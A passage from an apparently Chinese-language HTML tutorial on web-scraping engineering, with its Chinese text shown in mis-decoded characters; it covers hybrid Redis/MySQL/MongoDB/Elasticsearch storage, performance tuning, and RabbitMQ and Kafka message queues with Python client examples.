â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Redis  â”‚        â”‚  MySQL   â”‚
â”‚ (Cache) â”‚        â”‚ (Master) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
                        â”‚
              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
              â”‚                   â”‚
              â–¼                   â–¼
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚ MongoDB  â”‚        â”‚    ES    â”‚
        â”‚(æ–‡æ¡£å­˜å‚¨) â”‚        â”‚(å…¨æ–‡æœç´¢) â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>

      <h3 id="å®ç°ç¤ºä¾‹">å®ç°ç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">HybridStorage</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis</span> <span class="o">=</span> <span class="n">RedisStorage</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mysql</span> <span class="o">=</span> <span class="n">MySQLStorage</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo</span> <span class="o">=</span> <span class="n">MongoStorage</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">es</span> <span class="o">=</span> <span class="n">ElasticsearchStorage</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">save_article</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">article</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¿å­˜æ–‡ç« ï¼ˆå¤šå­˜å‚¨ï¼‰&quot;&quot;&quot;</span>
        <span class="c1"># 1. MySQL å­˜å‚¨åŸºæœ¬ä¿¡æ¯</span>
        <span class="n">article_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mysql</span><span class="o">.</span><span class="n">insert_article</span><span class="p">({</span>
            <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">article</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">],</span>
            <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">article</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">],</span>
            <span class="s1">&#39;created_at&#39;</span><span class="p">:</span> <span class="n">article</span><span class="p">[</span><span class="s1">&#39;created_at&#39;</span><span class="p">]</span>
        <span class="p">})</span>

        <span class="c1"># 2. MongoDB å­˜å‚¨å®Œæ•´æ–‡æ¡£</span>
        <span class="n">article</span><span class="p">[</span><span class="s1">&#39;_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">article_id</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo</span><span class="o">.</span><span class="n">insert_article</span><span class="p">(</span><span class="n">article</span><span class="p">)</span>

        <span class="c1"># 3. Elasticsearch ç´¢å¼•ï¼ˆç”¨äºæœç´¢ï¼‰</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="o">.</span><span class="n">index_document</span><span class="p">(</span><span class="n">article_id</span><span class="p">,</span> <span class="n">article</span><span class="p">)</span>

        <span class="c1"># 4. Redis ç¼“å­˜çƒ­ç‚¹æ•°æ®</span>
        <span class="n">cache_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;article:</span><span class="si">{</span><span class="n">article_id</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis</span><span class="o">.</span><span class="n">cache_result</span><span class="p">(</span><span class="n">cache_key</span><span class="p">,</span> <span class="n">article</span><span class="p">,</span> <span class="n">expire</span><span class="o">=</span><span class="mi">3600</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">article_id</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_article</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">article_id</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æ–‡ç« ï¼ˆç¼“å­˜ä¼˜å…ˆï¼‰&quot;&quot;&quot;</span>
        <span class="c1"># 1. å…ˆæŸ¥ Redis ç¼“å­˜</span>
        <span class="n">cache_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;article:</span><span class="si">{</span><span class="n">article_id</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="n">cached</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis</span><span class="o">.</span><span class="n">get_cache</span><span class="p">(</span><span class="n">cache_key</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">cached</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">cached</span>

        <span class="c1"># 2. æŸ¥ MongoDB</span>
        <span class="n">article</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mongo</span><span class="o">.</span><span class="n">articles</span><span class="o">.</span><span class="n">find_one</span><span class="p">({</span><span class="s1">&#39;_id&#39;</span><span class="p">:</span> <span class="n">article_id</span><span class="p">})</span>
        <span class="k">if</span> <span class="n">article</span><span class="p">:</span>
            <span class="c1"># å›å†™ç¼“å­˜</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">redis</span><span class="o">.</span><span class="n">cache_result</span><span class="p">(</span><span class="n">cache_key</span><span class="p">,</span> <span class="n">article</span><span class="p">,</span> <span class="n">expire</span><span class="o">=</span><span class="mi">3600</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">article</span>

        <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">search_articles</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">keyword</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æœç´¢æ–‡ç« ï¼ˆä½¿ç”¨ ESï¼‰&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">es</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">keyword</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ€§èƒ½ä¼˜åŒ–">æ€§èƒ½ä¼˜åŒ–</h2>

      <h3 id="1-æ‰¹é‡æ“ä½œ">1. æ‰¹é‡æ“ä½œ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ‰¹é‡æ’å…¥</span>
<span class="k">def</span><span class="w"> </span><span class="nf">batch_insert_optimized</span><span class="p">(</span><span class="n">articles</span><span class="p">,</span> <span class="n">batch_size</span><span class="o">=</span><span class="mi">1000</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">articles</span><span class="p">),</span> <span class="n">batch_size</span><span class="p">):</span>
        <span class="n">batch</span> <span class="o">=</span> <span class="n">articles</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">batch_size</span><span class="p">]</span>
        <span class="n">storage</span><span class="o">.</span><span class="n">batch_insert</span><span class="p">(</span><span class="n">batch</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="2-è¿æ¥æ± ">2. è¿æ¥æ± </h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨è¿æ¥æ± é¿å…é¢‘ç¹åˆ›å»ºè¿æ¥</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">dbutils.pooled_db</span><span class="w"> </span><span class="kn">import</span> <span class="n">PooledDB</span>

<span class="n">pool</span> <span class="o">=</span> <span class="n">PooledDB</span><span class="p">(</span>
    <span class="n">creator</span><span class="o">=</span><span class="n">pymysql</span><span class="p">,</span>
    <span class="n">maxconnections</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span>
    <span class="n">mincached</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
    <span class="n">blocking</span><span class="o">=</span><span class="kc">True</span>
<span class="p">)</span>
</code></pre>
      </div>

      <h3 id="3-ç´¢å¼•ä¼˜åŒ–">3. ç´¢å¼•ä¼˜åŒ–</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">-- åˆ›å»ºåˆé€‚çš„ç´¢å¼•</span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_user_created</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">articles</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">created_at</span><span class="p">);</span>

<span class="c1">-- åˆ†ææŸ¥è¯¢æ€§èƒ½</span>
<span class="k">EXPLAIN</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">articles</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">123</span><span class="p">;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#06-Engineering-distributed-scraping">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</a></li>
        <li><a href="#06-Engineering-docker-deployment">Docker å®¹å™¨åŒ–éƒ¨ç½²</a></li>
      </ul>

    </div>

    <div class="section" id="06-Engineering-message-queue-application">
      <h2>54. Message Queue Application</h2>
      <h1 id="æ¶ˆæ¯é˜Ÿåˆ—åº”ç”¨">æ¶ˆæ¯é˜Ÿåˆ—åº”ç”¨</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æ¶ˆæ¯é˜Ÿåˆ—æ˜¯åˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œç”¨äºè§£è€¦ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ã€å‰Šå³°å¡«è°·ã€å¼‚æ­¥å¤„ç†ã€‚æœ¬ç« ä»‹ç»å¸¸è§æ¶ˆæ¯é˜Ÿåˆ—çš„ä½¿ç”¨ã€‚</p>

      <hr />

      <h2 id="æ¶ˆæ¯é˜Ÿåˆ—å¯¹æ¯”">æ¶ˆæ¯é˜Ÿåˆ—å¯¹æ¯”</h2>

      <table>
        <thead>
          <tr>
            <th>ç‰¹æ€§</th>
            <th>RabbitMQ</th>
            <th>Kafka</th>
            <th>Redis</th>
            <th>Celery</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æ€§èƒ½</strong></td>
            <td>ä¸­ç­‰</td>
            <td>æé«˜</td>
            <td>é«˜</td>
            <td>ä¸­ç­‰</td>
          </tr>
          <tr>
            <td><strong>å¯é æ€§</strong></td>
            <td>é«˜</td>
            <td>é«˜</td>
            <td>ä¸­</td>
            <td>ä¸­</td>
          </tr>
          <tr>
            <td><strong>æ¶ˆæ¯é¡ºåº</strong></td>
            <td>æ”¯æŒ</td>
            <td>å¼ºä¿è¯</td>
            <td>ä¸ä¿è¯</td>
            <td>ä¸ä¿è¯</td>
          </tr>
          <tr>
            <td><strong>æŒä¹…åŒ–</strong></td>
            <td>æ”¯æŒ</td>
            <td>æ”¯æŒ</td>
            <td>å¯é€‰</td>
            <td>ä¾èµ– Broker</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>é€šç”¨æ¶ˆæ¯é˜Ÿåˆ—</td>
            <td>æ—¥å¿—æ”¶é›†ã€æµå¤„ç†</td>
            <td>è½»é‡çº§é˜Ÿåˆ—</td>
            <td>å¼‚æ­¥ä»»åŠ¡</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="rabbitmq">RabbitMQ</h2>

      <h3 id="åŸºæœ¬æ¦‚å¿µ">åŸºæœ¬æ¦‚å¿µ</h3>

      <ul>
        <li><strong>Producer</strong>: ç”Ÿäº§è€…ï¼Œå‘é€æ¶ˆæ¯</li>
        <li><strong>Consumer</strong>: æ¶ˆè´¹è€…ï¼Œæ¥æ”¶æ¶ˆæ¯</li>
        <li><strong>Exchange</strong>: äº¤æ¢æœºï¼Œè·¯ç”±æ¶ˆæ¯</li>
        <li><strong>Queue</strong>: é˜Ÿåˆ—ï¼Œå­˜å‚¨æ¶ˆæ¯</li>
        <li><strong>Binding</strong>: ç»‘å®šï¼ŒExchange å’Œ Queue çš„å…³ç³»</li>
      </ul>

      <h3 id="å®‰è£…å¯åŠ¨">å®‰è£…å¯åŠ¨</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Docker å¯åŠ¨</span>
docker<span class="w"> </span>run<span class="w"> </span>-d<span class="w"> </span>--name<span class="w"> </span>rabbitmq<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-p<span class="w"> </span><span class="m">5672</span>:5672<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-p<span class="w"> </span><span class="m">15672</span>:15672<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>rabbitmq:3-management

<span class="c1"># è®¿é—®ç®¡ç†ç•Œé¢</span>
<span class="c1"># http://localhost:15672</span>
<span class="c1"># é»˜è®¤è´¦å·: guest/guest</span>
</code></pre>
      </div>

      <h3 id="python-å®¢æˆ·ç«¯">Python å®¢æˆ·ç«¯</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">pika</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RabbitMQClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">connection</span> <span class="o">=</span> <span class="n">pika</span><span class="o">.</span><span class="n">BlockingConnection</span><span class="p">(</span>
            <span class="n">pika</span><span class="o">.</span><span class="n">ConnectionParameters</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">)</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">channel</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">declare_queue</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">queue_name</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å£°æ˜é˜Ÿåˆ—&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">queue_declare</span><span class="p">(</span>
            <span class="n">queue</span><span class="o">=</span><span class="n">queue_name</span><span class="p">,</span>
            <span class="n">durable</span><span class="o">=</span><span class="kc">True</span>  <span class="c1"># æŒä¹…åŒ–</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">publish</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">queue_name</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å‘å¸ƒæ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">basic_publish</span><span class="p">(</span>
            <span class="n">exchange</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span>
            <span class="n">routing_key</span><span class="o">=</span><span class="n">queue_name</span><span class="p">,</span>
            <span class="n">body</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">message</span><span class="p">),</span>
            <span class="n">properties</span><span class="o">=</span><span class="n">pika</span><span class="o">.</span><span class="n">BasicProperties</span><span class="p">(</span>
                <span class="n">delivery_mode</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>  <span class="c1"># æ¶ˆæ¯æŒä¹…åŒ–</span>
            <span class="p">)</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">consume</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">queue_name</span><span class="p">,</span> <span class="n">callback</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¶ˆè´¹æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">basic_qos</span><span class="p">(</span><span class="n">prefetch_count</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">basic_consume</span><span class="p">(</span>
            <span class="n">queue</span><span class="o">=</span><span class="n">queue_name</span><span class="p">,</span>
            <span class="n">on_message_callback</span><span class="o">=</span><span class="n">callback</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">start_consuming</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># ç”Ÿäº§è€…</span>
<span class="n">producer</span> <span class="o">=</span> <span class="n">RabbitMQClient</span><span class="p">()</span>
<span class="n">producer</span><span class="o">.</span><span class="n">declare_queue</span><span class="p">(</span><span class="s1">&#39;urls&#39;</span><span class="p">)</span>
<span class="n">producer</span><span class="o">.</span><span class="n">publish</span><span class="p">(</span><span class="s1">&#39;urls&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span> <span class="s1">&#39;depth&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">})</span>

<span class="c1"># æ¶ˆè´¹è€…</span>
<span class="k">def</span><span class="w"> </span><span class="nf">process_url</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">properties</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Processing: </span><span class="si">{</span><span class="n">message</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="c1"># å¤„ç†å®Œæˆåç¡®è®¤</span>
    <span class="n">ch</span><span class="o">.</span><span class="n">basic_ack</span><span class="p">(</span><span class="n">delivery_tag</span><span class="o">=</span><span class="n">method</span><span class="o">.</span><span class="n">delivery_tag</span><span class="p">)</span>

<span class="n">consumer</span> <span class="o">=</span> <span class="n">RabbitMQClient</span><span class="p">()</span>
<span class="n">consumer</span><span class="o">.</span><span class="n">consume</span><span class="p">(</span><span class="s1">&#39;urls&#39;</span><span class="p">,</span> <span class="n">process_url</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="topic-exchange-ç¤ºä¾‹">Topic Exchange ç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">TopicExchangeClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">connection</span> <span class="o">=</span> <span class="n">pika</span><span class="o">.</span><span class="n">BlockingConnection</span><span class="p">(</span>
            <span class="n">pika</span><span class="o">.</span><span class="n">ConnectionParameters</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">)</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">channel</span><span class="p">()</span>

        <span class="c1"># å£°æ˜ Topic Exchange</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">exchange_declare</span><span class="p">(</span>
            <span class="n">exchange</span><span class="o">=</span><span class="s1">&#39;scraper_topics&#39;</span><span class="p">,</span>
            <span class="n">exchange_type</span><span class="o">=</span><span class="s1">&#39;topic&#39;</span><span class="p">,</span>
            <span class="n">durable</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">publish_with_routing</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">routing_key</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å‘å¸ƒå¸¦è·¯ç”±çš„æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">basic_publish</span><span class="p">(</span>
            <span class="n">exchange</span><span class="o">=</span><span class="s1">&#39;scraper_topics&#39;</span><span class="p">,</span>
            <span class="n">routing_key</span><span class="o">=</span><span class="n">routing_key</span><span class="p">,</span>
            <span class="n">body</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">subscribe_pattern</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">callback</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®¢é˜…ç¬¦åˆæ¨¡å¼çš„æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">queue_declare</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">exclusive</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="n">queue_name</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">method</span><span class="o">.</span><span class="n">queue</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">queue_bind</span><span class="p">(</span>
            <span class="n">exchange</span><span class="o">=</span><span class="s1">&#39;scraper_topics&#39;</span><span class="p">,</span>
            <span class="n">queue</span><span class="o">=</span><span class="n">queue_name</span><span class="p">,</span>
            <span class="n">routing_key</span><span class="o">=</span><span class="n">pattern</span>
        <span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">basic_consume</span><span class="p">(</span>
            <span class="n">queue</span><span class="o">=</span><span class="n">queue_name</span><span class="p">,</span>
            <span class="n">on_message_callback</span><span class="o">=</span><span class="n">callback</span><span class="p">,</span>
            <span class="n">auto_ack</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">channel</span><span class="o">.</span><span class="n">start_consuming</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">TopicExchangeClient</span><span class="p">()</span>

<span class="c1"># å‘å¸ƒä¸åŒç±»å‹çš„æ¶ˆæ¯</span>
<span class="n">client</span><span class="o">.</span><span class="n">publish_with_routing</span><span class="p">(</span><span class="s1">&#39;news.tech&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="s1">&#39;Tech News&#39;</span><span class="p">})</span>
<span class="n">client</span><span class="o">.</span><span class="n">publish_with_routing</span><span class="p">(</span><span class="s1">&#39;news.sports&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="s1">&#39;Sports News&#39;</span><span class="p">})</span>
<span class="n">client</span><span class="o">.</span><span class="n">publish_with_routing</span><span class="p">(</span><span class="s1">&#39;video.movie&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="s1">&#39;Movie Title&#39;</span><span class="p">})</span>

<span class="c1"># è®¢é˜…æ‰€æœ‰æ–°é—»</span>
<span class="n">client</span><span class="o">.</span><span class="n">subscribe_pattern</span><span class="p">(</span><span class="s1">&#39;news.*&#39;</span><span class="p">,</span> <span class="n">callback</span><span class="p">)</span>

<span class="c1"># è®¢é˜…æ‰€æœ‰æ¶ˆæ¯</span>
<span class="n">client</span><span class="o">.</span><span class="n">subscribe_pattern</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="n">callback</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="kafka">Kafka</h2>

      <h3 id="é€‚ç”¨åœºæ™¯">é€‚ç”¨åœºæ™¯</h3>

      <ul>
        <li>å¤§è§„æ¨¡æ—¥å¿—æ”¶é›†</li>
        <li>å®æ—¶æ•°æ®æµå¤„ç†</li>
        <li>é«˜ååé‡æ¶ˆæ¯ä¼ é€’</li>
      </ul>

      <h3 id="å¯åŠ¨-kafka">å¯åŠ¨ Kafka</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Docker Compose</span>
version:<span class="w"> </span><span class="s1">&#39;3&#39;</span>
services:
<span class="w">  </span>zookeeper:
<span class="w">    </span>image:<span class="w"> </span>confluentinc/cp-zookeeper:latest
<span class="w">    </span>environment:
<span class="w">      </span>ZOOKEEPER_CLIENT_PORT:<span class="w"> </span><span class="m">2181</span>

<span class="w">  </span>kafka:
<span class="w">    </span>image:<span class="w"> </span>confluentinc/cp-kafka:latest
<span class="w">    </span>depends_on:
<span class="w">      </span>-<span class="w"> </span>zookeeper
<span class="w">    </span>ports:
<span class="w">      </span>-<span class="w"> </span><span class="s2">&quot;9092:9092&quot;</span>
<span class="w">    </span>environment:
<span class="w">      </span>KAFKA_ZOOKEEPER_CONNECT:<span class="w"> </span>zookeeper:2181
<span class="w">      </span>KAFKA_ADVERTISED_LISTENERS:<span class="w"> </span>PLAINTEXT://localhost:9092
<span class="w">      </span>KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR:<span class="w"> </span><span class="m">1</span>
</code></pre>
      </div>

      <h3 id="python-å®¢æˆ·ç«¯-2">Python å®¢æˆ·ç«¯</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">kafka</span><span class="w"> </span><span class="kn">import</span> <span class="n">KafkaProducer</span><span class="p">,</span> <span class="n">KafkaConsumer</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">class</span><span class="w"> </span><span class="nc">KafkaClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bootstrap_servers</span><span class="o">=</span><span class="s1">&#39;localhost:9092&#39;</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">bootstrap_servers</span> <span class="o">=</span> <span class="n">bootstrap_servers</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_producer</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–ç”Ÿäº§è€…&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="n">KafkaProducer</span><span class="p">(</span>
            <span class="n">bootstrap_servers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">bootstrap_servers</span><span class="p">,</span>
            <span class="n">value_serializer</span><span class="o">=</span><span class="k">lambda</span> <span class="n">v</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">),</span>
            <span class="n">acks</span><span class="o">=</span><span class="s1">&#39;all&#39;</span><span class="p">,</span>  <span class="c1"># ç­‰å¾…æ‰€æœ‰å‰¯æœ¬ç¡®è®¤</span>
            <span class="n">retries</span><span class="o">=</span><span class="mi">3</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_consumer</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">topic</span><span class="p">,</span> <span class="n">group_id</span><span class="o">=</span><span class="s1">&#39;scraper-group&#39;</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æ¶ˆè´¹è€…&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="n">KafkaConsumer</span><span class="p">(</span>
            <span class="n">topic</span><span class="p">,</span>
            <span class="n">bootstrap_servers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">bootstrap_servers</span><span class="p">,</span>
